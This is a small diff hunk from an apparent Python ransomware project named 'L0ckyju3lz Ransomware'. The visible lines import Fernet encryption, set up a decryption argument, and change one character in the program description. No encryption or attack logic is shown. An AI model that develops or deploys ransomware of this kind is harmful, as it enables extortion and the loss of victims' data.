@@ -10,7 +10,7 @@ from os.path import expanduser
 from cryptography.fernet import Fernet
 from argparse import ArgumentParser
 
-parser = ArgumentParser(description="L0ckyju3lz Ransomware v 1.0")
+parser = ArgumentParser(description="L0ckyju3lz Ransomware v.1.0")
 parser.add_argument("-decf", dest="dec", metavar="Decryption")
 args = parser.parse_args()
 
